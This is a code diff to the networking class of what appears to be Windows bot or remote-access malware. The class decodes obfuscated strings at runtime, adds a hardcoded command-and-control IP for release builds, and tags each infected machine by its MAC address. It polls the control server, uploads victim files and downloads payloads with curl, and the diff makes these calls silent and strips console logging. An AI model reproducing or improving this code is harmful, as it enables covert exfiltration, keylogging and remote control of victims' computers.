@@ -13,8 +13,12 @@
 Curl::Curl()
 {
 	this->Keylogger_status = FALSE;
-
-	this->redirect_website = decode("1/1/0.0.7.12//p:ttlhtm.hgePactredire"); // decode -> http://127.0.0.1/1/redirectPage.html
+	#ifdef TESTING
+		this->redirect_website = decode("1/1/0.0.7.12//p:ttlhtm.hgePactredire"); // decode -> http://127.0.0.1/1/redirectPage.html
+	#else
+		this->redirect_website = decode("/1359..5294./3:/tphtmlhte.agtPecired/r"); // decode -> http://34.29.59.35/1/redirectPage.html
+	#endif
+	
 	this->mac_address = Tools::CMD(decode("et gueTrr=teapAdalicysPhe erwhc nic mi2wt rsFi - 1ipSk -ctlese| s esdrAdAC M"), TRUE, TRUE); // decode -> wmic nic where PhysicalAdapter=True get MACAddress | select -Skip 1 -First 2
 	if (this->mac_address.find(':') != std::string::npos)
 		this->mac_address.erase(std::remove(this->mac_address.begin(), this->mac_address.end(), ':'), this->mac_address.end());
@@ -28,15 +32,16 @@ Curl::Curl()
 void Curl::Initialize()
 {
 	#ifndef LOG_OFF
-		std::cout << "Curl::Initialize: Initializing CURL\n";
 		OutputDebugStringA("Curl::Initialize: Initializing CURL\n");
 	#endif // !LOG_OFF
 
 	std::string check_status = "";
 	int check_count = 0;
+	std::string sLog = "";
 	
 	#ifndef LOG_OFF
-		std::cout << "Initializing CURL: " << this->redirect_website << "\n";
+		sLog = "Initializing CURL: " + this->redirect_website + "\n";
+		OutputDebugStringA(sLog.c_str());
 	#endif // !LOG_OFF
 
 	// Get the control website url from the redirect website
@@ -44,15 +49,20 @@ void Curl::Initialize()
 		if (!Send_Recv(this->control_website, this->redirect_website))
 		{
 			#ifndef LOG_OFF
-				std::cout << "Failed to get the control website url from the redirect website...\n";
+				sLog = "Failed to get the control website url from the redirect website...\n";
+				OutputDebugStringA(sLog.c_str());
 			#endif // !LOG_OFF
 			Sleep(10000);
 		}
 		else
 		{
+			if (this->control_website.find("http") != std::string::npos)
+				this->control_website = this->control_website.substr(this->control_website.find("http"));
+
 			#ifndef LOG_OFF
-				std::cout << "Successfully got the control website url from the redirect website...\n";
-				std::cout << "Control website url: " << this->control_website << "\n";
+				sLog = "Successfully got the control website url from the redirect website...\n";
+				sLog += "Control website url: " + this->control_website + "\n";
+				OutputDebugStringA(sLog.c_str());
 			#endif // !LOG_OFF
 		}
 	
@@ -79,7 +89,7 @@ BOOL Curl::Send_Recv(std::string& result, std::string website, std::string param
 {
 	if (website == "")
 	{
-		website = this->control_website + decode("bo=?t") + this->mac_address; // decode -> ?bot=
+		website = this->control_website + decode("id=?") + this->mac_address; // decode -> ?id=
 		if (parametres != "")
 			website += parametres;
 
@@ -88,10 +98,11 @@ BOOL Curl::Send_Recv(std::string& result, std::string website, std::string param
 #endif // !LOG_OFF
 	}
 
-	std::string command = Tools::decode("urlc") + " \"" + website + "\""; // decode -> curl
+	//cmd.exe /c curl "http://34.29.59.35/2/Receive_Send.php?id=FC3497957CFE"
+	std::string command = Tools::decode("urlc") + " \"" + website + "\" -s"; // decode -> curl
 	result = Tools::CMD(command.c_str());
 
-	if (result.find(Tools::decode(" FotdNuno")) != std::string::npos && !isInitializing) 
+	if (result.find(Tools::decode(" FotdNuno")) != std::string::npos && !isInitializing)
 	{
 		if (website == this->control_website || website == this->redirect_website)
 		{
@@ -128,7 +139,7 @@ std::string Curl::anonFilesUpload(const std::string& file_path)
 	if (Tools::FileExists(file_path))
 	{
 		std::string url = "";
-		std::string command = Tools::decode("F  -rlcu=@lefi\"") + file_path + "\" " + this->control_website + "?bot=" + this->mac_address; // decode -> curl -F \"file=@, Receive_Send.php?bot=
+		std::string command = Tools::decode("F  -rlcu=@lefi\"") + file_path + "\" " + this->control_website + "?id=" + this->mac_address + " -s"; // decode -> curl -F \"file=@, Receive_Send.php?bot=
 		//curl -F "file=@C:\Users\ADMINI~1\AppData\Local\Temp\sjfo34fu9c.png" https://api.anonfiles.com/upload
 		//curl -F "file=@C:\Users\Administrator\Pictures\AnyDesk\1.png" http://127.0.0.1/2/Receive_Send.php?bot=FC3497957CFE
 		std::string result = Tools::CMD(command);
@@ -154,7 +165,7 @@ BOOL Curl::DownloadFile(const std::string& file)
 		std::size_t found = this->control_website.find_last_of("/\\");
 		std::string uploads_path = this->control_website.substr(0, found) + "\\" + Tools::decode("") + "\\"; // decode -> uploads
 
-		std::string command = Tools::decode("ur cl") + uploads_path + file + Tools::decode("ut-o -t pu") + file; // decode -> curl, --ouput
+		std::string command = Tools::decode("ur cl") + uploads_path + file + Tools::decode("ut-o -t pu") + file + " -s"; // decode -> curl, --ouput
 		Tools::CMD(command);
 
 		HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
